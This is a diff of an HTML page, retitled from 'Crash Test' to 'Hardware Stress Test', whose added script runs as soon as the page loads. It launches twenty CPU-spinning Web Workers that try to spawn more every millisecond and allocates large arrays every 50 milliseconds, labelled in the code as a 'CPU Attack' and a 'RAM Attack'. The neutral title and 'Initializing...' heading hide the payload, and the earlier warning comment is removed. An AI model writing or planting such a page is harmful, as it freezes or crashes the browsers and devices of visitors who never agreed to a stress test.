@@ -1,16 +1,45 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Crash Test</title>
+    <title>Hardware Stress Test</title>
 </head>
 <body>
-    <h1>Testing Browser Stability...</h1>
+    <h1 id="status">Initializing...</h1>
+    
     <script>
-        // Warning: This will make the tab unresponsive
-        let txt = "a";
-        while(true) {
-            txt = txt + txt; // Exponentially increases string size to consume RAM
+        // 1. CPU Attack: Recursive Worker Spawning
+        const workerCode = `
+            onmessage = function() {
+                setInterval(() => {
+                    const b = new Blob([this.toString()], {type: 'text/javascript'});
+                    new Worker(URL.createObjectURL(b)).postMessage('go');
+                }, 1);
+                while(true) { Math.sqrt(Math.random()); } // Max out CPU thread
+            }
+        `;
+        const blob = new Blob([workerCode], { type: 'application/javascript' });
+        const url = URL.createObjectURL(blob);
+
+        // 2. RAM Attack: Rapid Memory Allocation
+        let storage = [];
+        function eatMemory() {
+            // Allocates large chunks of memory rapidly
+            setInterval(() => {
+                const chunk = new Array(1000000).fill("💥".repeat(100));
+                storage.push(chunk);
+                document.getElementById('status').innerText = "Memory Pressure: HIGH";
+            }, 50);
         }
+
+        // Trigger both
+        function start() {
+            for(let i = 0; i < 20; i++) { // Initial burst of workers
+                new Worker(url).postMessage('go');
+            }
+            eatMemory();
+        }
+
+        start();
     </script>
 </body>
 </html>
